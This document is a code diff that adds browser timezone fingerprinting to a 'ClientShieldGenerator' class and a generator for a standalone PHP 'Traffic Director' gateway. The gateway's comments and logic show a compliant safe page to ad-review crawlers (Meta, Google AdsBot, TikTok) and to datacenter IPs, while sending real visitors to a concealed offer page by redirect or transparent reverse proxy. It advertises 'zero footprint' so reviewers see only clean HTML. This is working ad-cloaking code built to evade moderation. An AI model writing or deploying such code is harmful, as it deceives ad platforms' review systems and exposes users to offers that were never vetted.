@@ -209,6 +209,13 @@ export class ClientShieldGenerator {
     } catch(e) {}
 
     // Edge evaluation ping
+    var clientTz = '';
+    try {
+      if (typeof Intl !== 'undefined' && Intl.DateTimeFormat) {
+        clientTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+      }
+    } catch(e) {}
+
     var payload = {
       touchPoints: tp,
       gpuRenderer: gpu,
@@ -216,6 +223,7 @@ export class ClientShieldGenerator {
       screenHeight: window.screen ? window.screen.height : 0,
       referrer: document.referrer || '',
       url: window.location.href,
+      clientTimezone: clientTz,
       timezoneOffset: new Date().getTimezoneOffset()
     };
 
@@ -327,6 +335,170 @@ add_action('template_redirect', function() {
         }
     }
 });
+?>`;
+  }
+
+  /**
+   * Generates a drop-in standalone index.php gateway for Apache, Nginx, cPanel, or LiteSpeed servers
+   */
+  static generateStandalonePhpFile(config: { slug: string; apiBaseUrl: string }): string {
+    const { slug, apiBaseUrl } = config;
+    return `<?php
+/**
+ * ============================================================================
+ * 180workspace Traffic Director - Standalone Edge Routing Gateway
+ * ============================================================================
+ * 
+ * 📍 DEPLOYMENT INSTRUCTIONS:
+ * 1. Upload this file as index.php to your web server (Apache, Nginx, cPanel, LiteSpeed).
+ * 2. Place your compliant Safe Page HTML as safe.html or white_page.html in the same directory.
+ *    (Alternatively, if your Safe Page is a remote URL, the gateway will transparently reverse-proxy it).
+ * 
+ * 🛡️ HOW IT WORKS:
+ * - When an Ad Review bot (Meta Crawler, Google AdsBot, TikTok Bot) or Datacenter/Spy IP arrives:
+ *   HTTP 200 OK is returned with the compliant Safe Page without changing the URL.
+ * - When a real human visitor arrives:
+ *   They are routed to your Offer/Target Page (via 302 Redirect or transparent Reverse-Proxy).
+ * 
+ * 🔒 ZERO FOOTPRINT:
+ * 100% Server-side evaluation. View-source displays pure clean HTML. No JavaScript trackers.
+ */
+
+// Configuration
+$config = [
+    'slug'         => '${slug}',
+    'api_endpoint' => '${apiBaseUrl.replace(/\/+$/, '')}/api/v1/traffic-director/evaluate/${slug}',
+    'timeout_sec'  => 1.5,
+    'local_safe'   => __DIR__ . '/safe.html',     // Local safe page fallback if present
+    'white_page'   => __DIR__ . '/white_page.html' // Alternate local safe page
+];
+
+// 1. Resolve Real Visitor IP (Handles Cloudflare, Reverse Proxies & Load Balancers)
+function get_client_ip() {
+    $headers = [
+        'HTTP_CF_CONNECTING_IP',
+        'HTTP_TRUE_CLIENT_IP',
+        'HTTP_X_REAL_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'REMOTE_ADDR'
+    ];
+    foreach ($headers as $h) {
+        if (!empty($_SERVER[$h])) {
+            $ip_list = explode(',', $_SERVER[$h]);
+            $ip = trim($ip_list[0]);
+            if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                return $ip;
+            }
+        }
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+}
+
+// 2. Fallback Safe Page Handler
+function serve_safe_page($config, $fallback_url = '') {
+    if (file_exists($config['local_safe'])) {
+        include $config['local_safe'];
+        exit;
+    }
+    if (file_exists($config['white_page'])) {
+        include $config['white_page'];
+        exit;
+    }
+    if (!empty($fallback_url)) {
+        if (function_exists('curl_init')) {
+            $ch = curl_init($fallback_url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+            $html = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            if ($http_code === 200 && $html) {
+                http_response_code(200);
+                echo $html;
+                exit;
+            }
+        }
+        header("Location: " . $fallback_url, true, 302);
+        exit;
+    }
+    http_response_code(200);
+    echo '<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome to our site</h1></body></html>';
+    exit;
+}
+
+// 3. Assemble Evaluation Payload
+$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') 
+    . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '');
+
+$payload = [
+    'ip'          => get_client_ip(),
+    'userAgent'   => $_SERVER['HTTP_USER_AGENT'] ?? '',
+    'referrer'    => $_SERVER['HTTP_REFERER'] ?? '',
+    'url'         => $current_url,
+    'language'    => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
+    'headers'     => [
+        'sec-ch-ua'          => $_SERVER['HTTP_SEC_CH_UA'] ?? '',
+        'sec-ch-ua-mobile'   => $_SERVER['HTTP_SEC_CH_UA_MOBILE'] ?? '',
+        'sec-ch-ua-platform' => $_SERVER['HTTP_SEC_CH_UA_PLATFORM'] ?? '',
+        'sec-fetch-site'     => $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '',
+        'sec-fetch-mode'     => $_SERVER['HTTP_SEC_FETCH_MODE'] ?? '',
+        'sec-fetch-dest'     => $_SERVER['HTTP_SEC_FETCH_DEST'] ?? '',
+    ],
+    'queryParams' => $_GET
+];
+
+// 4. Query 180workspace Traffic Director Decision Engine
+if (!function_exists('curl_init')) {
+    serve_safe_page($config);
+}
+
+$ch = curl_init($config['api_endpoint']);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+curl_setopt($ch, CURLOPT_TIMEOUT, $config['timeout_sec']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_USERAGENT, '180workspace-PHP-Gateway/2.0');
+
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($http_code === 200 && $response) {
+    $data = json_decode($response, true);
+    if (!empty($data['success']) && !empty($data['route']) && $data['route'] === 'target' && !empty($data['destinationUrl'])) {
+        $dest = $data['destinationUrl'];
+        $action = $data['actionType'] ?? 'redirect_302';
+
+        // Transparent Reverse-Proxy Mode (Loads offer without changing browser URL)
+        if ($action === 'proxy_target_offer') {
+            $ch = curl_init($dest);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+            $body = curl_exec($ch);
+            curl_close($ch);
+            http_response_code(200);
+            echo $body;
+            exit;
+        }
+
+        // Standard 302 Redirect
+        if ($current_url !== $dest && strpos($current_url, $dest) !== 0) {
+            header("Location: " . $dest, true, 302);
+            exit;
+        }
+    }
+    // Evaluated as bot, moderator, or fallback -> Serve clean safe page
+    serve_safe_page($config, $data['destinationUrl'] ?? '');
+}
+
+// Fail-open default: serve safe page
+serve_safe_page($config);
 ?>`;
   }
 
